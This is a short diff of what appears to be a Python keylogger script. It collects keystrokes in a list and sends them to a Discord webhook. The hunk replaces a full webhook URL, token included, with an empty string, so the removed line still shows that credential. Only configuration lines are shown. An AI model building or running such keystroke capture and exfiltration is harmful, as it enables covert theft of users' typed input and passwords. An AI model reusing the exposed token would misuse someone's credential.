@@ -4,7 +4,7 @@ import requests
 import threading
 
 # Input my discord webhook server link below
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1445294203755303073/kjqrwQFK9KPkvzQocDgsIn4F5i3cp9uObvrqeaLJd6P1ZRCUSp3MPys0TnVsrzNu1A_m'
+DISCORD_WEBHOOK_URL = ''
 
 # Make keylogs variable to save button keyboard that recorded
 keylogs = []
